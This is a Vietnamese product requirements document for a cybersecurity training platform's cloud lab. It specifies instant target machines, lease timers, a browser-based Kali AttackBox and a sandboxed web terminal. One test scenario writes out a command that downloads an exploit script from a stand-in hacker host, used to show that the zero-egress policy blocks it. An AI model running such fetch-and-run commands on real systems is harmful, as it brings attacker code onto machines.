# Epic 3: Zero-Setup Cloud Lab & In-Browser Practice

### Epic: Hạ tầng Phòng Lab Đám mây Không cần Cài đặt & Thực hành Trên Trình duyệt (Zero-Setup Cloud Lab & In-Browser Practice)

---

#### Story US-03.01: Là một học viên đang làm bài thực hành, tôi muốn khởi chạy máy mục tiêu chỉ với 1 cú click chuột và nhận được địa chỉ IP sẵn sàng trong thời gian nhanh nhất, để tôi có thể bắt đầu thao tác tấn công/khám phá ngay mà không phải tốn thời gian cài đặt máy ảo cá nhân.
* **Business Rules (Ràng buộc nghiệp vụ):**
  - Thời gian khởi chạy (SLA):
    + Linux Docker Container: Sẵn sàng trong vòng $< 3$ giây.
    + Virtual Machine chuyên sâu (Firecracker MicroVM / Windows Lab): Sẵn sàng trong vòng $< 60$ giây kèm thanh tiến trình trực quan.
  - Cấp phát IP nội bộ riêng biệt thuộc dải mạng chuẩn hóa `100.64.0.0/10` (RFC 6598 - Carrier-Grade NAT), loại bỏ hoàn toàn xung đột với dải IP LAN cá nhân (`192.168.x.x` hoặc `10.x.x.x`).
  - Giới hạn đồng thời (Concurrency Limit): Mỗi tài khoản chỉ được phép khởi chạy tối đa 01 máy mục tiêu và 01 AttackBox tại một thời điểm để tối ưu hóa tài nguyên phần cứng.
  - Máy mục tiêu phải được cô lập mạng tuyệt đối (Zero Egress - cấm kết nối ra ngoài Internet).
* **Acceptance Criteria:**
  - **Scenario 1 (Thành công - Khởi chạy nhanh máy mục tiêu Linux Container):**
    - **Given** Học viên đang ở phòng lab "Web SQL Injection" và hiện chưa có máy lab nào đang chạy.
    - **When** Học viên nhấn nút "Start Machine".
    - **Then** Trạng thái nút chuyển sang "Starting..." và máy được cấp phát thành công trong vòng $< 3$ giây.
    - **And** Giao diện hiển thị địa chỉ IP nội bộ của máy (ví dụ: `100.64.12.84`).
    - **And** Bắt đầu đồng hồ đếm ngược thời gian thuê ban đầu là `60:00`.
    - **And** Nút "Start Machine" chuyển thành nút "Stop Machine" màu đỏ và xuất hiện thêm nút "+1 Hour".
  - **Scenario 2 (Ngoại lệ - Người dùng cố tình khởi chạy máy thứ 2 khi máy cũ chưa dừng):**
    - **Given** Học viên đang có một máy mục tiêu đang chạy tại phòng lab "Linux Basics".
    - **When** Học viên chuyển sang phòng lab "Buffer Overflow" và nhấn nút "Start Machine".
    - **Then** Hệ thống không khởi tạo máy mới và hiển thị hộp thoại cảnh báo: "You already have an active lab machine running in 'Linux Basics'. Would you like to terminate it and switch to this room?".
    - **And** Nếu học viên chọn "Cancel", máy cũ vẫn hoạt động; nếu chọn "Confirm & Switch", máy cũ bị hủy ngay lập tức và máy mới bắt đầu khởi tạo.

---

#### Story US-03.02: Là một học viên, tôi muốn có cơ chế đếm ngược thời hạn thuê phòng lab rõ ràng và có thể chủ động gia hạn thời gian làm bài, đồng thời hệ thống tự động dọn dẹp máy khi hết hạn, để tôi không bị gián đoạn bài học và nhà trường/hệ thống tiết kiệm được chi phí điện toán đám mây.
* **Business Rules (Ràng buộc nghiệp vụ):**
  - Thời gian thuê mặc định ban đầu là 60 phút.
  - Học viên có quyền nhấn nút "+1 Hour" để gia hạn thêm 60 phút mỗi lần; số lần gia hạn tối đa là 3 lần (tổng thời gian một phiên liên tục tối đa là 4 giờ).
  - Khi đồng hồ đếm ngược về `00:00`, máy chuyển sang trạng thái ân hạn (Grace Period) kéo dài 3 phút kèm thông báo cảnh báo âm thanh và popup nhấp nháy trên màn hình.
  - Hết 3 phút ân hạn nếu học viên không gia hạn, Daemon Reaper sẽ tự động tiêu hủy container/máy ảo, giải phóng RAM, CPU và IP nội bộ.
* **Acceptance Criteria:**
  - **Scenario 1 (Thành công - Gia hạn thêm 1 giờ khi máy sắp hết hạn):**
    - **Given** Máy lab của học viên đang chạy và thời gian còn lại là `04:30` (đã gia hạn 1 lần trước đó).
    - **When** Học viên nhấn vào nút "+1 Hour".
    - **Then** Đồng hồ thời gian lập tức cộng thêm 60 phút thành `64:30`.
    - **And** Hệ thống hiển thị thông báo "Lease extended successfully. Remaining extensions: 1/3".
  - **Scenario 2 (Ngoại lệ - Quá số lần gia hạn và tự động thu hồi khi hết thời gian ân hạn):**
    - **Given** Học viên đã sử dụng hết 3/3 lượt gia hạn và đồng hồ đếm ngược chạm mốc `00:00`.
    - **When** Hệ thống chuyển sang chế độ Grace Period 3 phút và học viên không có tương tác nào trong suốt 3 phút này.
    - **Then** Daemon Reaper kích hoạt lệnh hủy instance, giải phóng toàn bộ tài nguyên trên Worker Node.
    - **And** Giao diện trên trình duyệt chuyển về trạng thái ban đầu với thông báo "Lab session expired and has been cleaned up. Click 'Start Machine' to spawn a fresh instance".

---

#### Story US-03.03: Là một học viên không có máy tính chuyên dụng cho an ninh mạng, tôi muốn mở và điều khiển trực tiếp một máy trạm Kali Linux (AttackBox) đầy đủ công cụ pentest ngay trên tab trình duyệt, để tôi có thể học tập từ bất kỳ thiết bị nào (Chromebook, macOS, Windows) mà không cần cài đặt thêm phần mềm.
* **Business Rules (Ràng buộc nghiệp vụ):**
  - Truyền phát màn hình đồ họa thông qua Apache Guacamole / HTML5 Canvas / WebSocket.
  - Độ trễ phản hồi thao tác chuột và bàn phím phải đạt $< 80\text{ms}$ trong điều kiện mạng tiêu chuẩn.
  - Hỗ trợ đầy đủ bộ công cụ kiểm thử bảo mật cốt lõi: Burp Suite, Nmap, Metasploit, Wireshark, SQLmap, John the Ripper.
  - Tích hợp tính năng Clipboard chia sẻ dữ liệu hai chiều: Học viên có thể sao chép văn bản, lệnh hoặc chuỗi flag từ máy thật và dán trực tiếp vào Kali Linux (và ngược lại) thông qua thanh công cụ Guacamole.
  - Tự động khôi phục kết nối (Auto-reconnect) trong vòng 10 giây nếu kết nối mạng của học viên bị chập chờn mà không làm mất trạng thái công việc đang chạy trên máy ảo.
* **Acceptance Criteria:**
  - **Scenario 1 (Thành công - Mở AttackBox trên trình duyệt và truyền nhận dữ liệu clipboard):**
    - **Given** Học viên đang ở trong phòng học và nhấn "Start AttackBox".
    - **When** Quá trình cấp phát hoàn tất và màn hình desktop Kali Linux hiển thị trên trình duyệt.
    - **Then** Học viên có thể mở Terminal, gõ lệnh `nmap` và nhận kết quả phản hồi mượt mà không bị delay.
    - **And** Học viên sao chép một chuỗi lệnh từ giáo trình trên máy thật và nhấn `Ctrl+V` (hoặc phím tắt quy định) vào terminal của Kali, chuỗi lệnh được dán chính xác vào dòng lệnh.
  - **Scenario 2 (Thất bại / Ngoại lệ - Xử lý ngắt kết nối mạng tạm thời):**
    - **Given** Học viên đang mở AttackBox và đang chạy một tiến trình quét cổng Nmap.
    - **When** Đường truyền mạng của học viên bị mất tín hiệu trong 5 giây rồi có lại.
    - **Then** Khung màn hình hiển thị overlay thông báo "Connection lost. Reconnecting to your AttackBox session (Attempt 1/3)...".
    - **And** Khi có mạng trở lại, màn hình khôi phục ngay lập tức mà không cần tải lại toàn bộ trang, tiến trình Nmap vẫn tiếp tục chạy bình thường từ thời điểm trước đó.

---

#### Story US-03.04: Là một học viên học các bài lý thuyết và thực hành dòng lệnh cơ bản, tôi muốn sử dụng cửa sổ Web Terminal (xterm.js) nhúng trực tiếp trong trang, để tôi có thể thực hành các câu lệnh Linux một cách nhẹ nhàng, tiết kiệm băng thông tối đa so với việc phải mở cả màn hình đồ họa.
* **Business Rules (Ràng buộc nghiệp vụ):**
  - Sử dụng thư viện `xterm.js` kết nối qua WebSocket an toàn (WSS) tới container sandbox.
  - Giới hạn tài nguyên nghiêm ngặt cho mỗi session Web Terminal: CPU 0.5 core, RAM 512MB, bộ nhớ tạm 2GB.
  - Cách ly mạng tuyệt đối (Zero Egress): Chặn hoàn toàn kết nối ra Internet từ container terminal để ngăn chặn hành vi lợi dụng terminal đào tiền ảo hoặc quét mạng ngoài.
  - Tự động ngắt phiên terminal (Inactivity Timeout) nếu không có phím bấm nào được gõ trong 15 phút.
* **Acceptance Criteria:**
  - **Scenario 1 (Thành công - Thao tác trên Web Terminal mượt mà với độ trễ cực thấp):**
    - **Given** Học viên đang học bài "Linux File Management" và click chọn tab "Terminal".
    - **When** Cửa sổ dòng lệnh `student@cyberforce:~$ ` hiển thị và học viên gõ lệnh `cat /etc/passwd`.
    - **Then** Kết quả nội dung file hiển thị ngay lập tức ($< 50\text{ms}$) trên màn hình terminal.
    - **And** Hỗ trợ đầy đủ các phím mũi tên lên/xuống (lịch sử lệnh), phím Tab (auto-complete) và phím tắt `Ctrl+C`.
  - **Scenario 2 (Ngoại lệ - Ngăn chặn học viên tải script độc hại từ Internet qua Web Terminal):**
    - **Given** Học viên đang mở Web Terminal trong phòng lab.
    - **When** Học viên cố tình gõ lệnh tải tệp từ bên ngoài: `curl -O http://external-hacker-site.com/exploit.sh`.
    - **Then** Lệnh bị treo và trả về lỗi "Connection timed out" hoặc "Network is unreachable" do chính sách Zero Egress chặn mọi traffic ra ngoài.
    - **And** Hệ thống ghi log cảnh báo an ninh ngầm: `OUTBOUND_NETWORK_BLOCKED: Command=curl, User=student_id`.
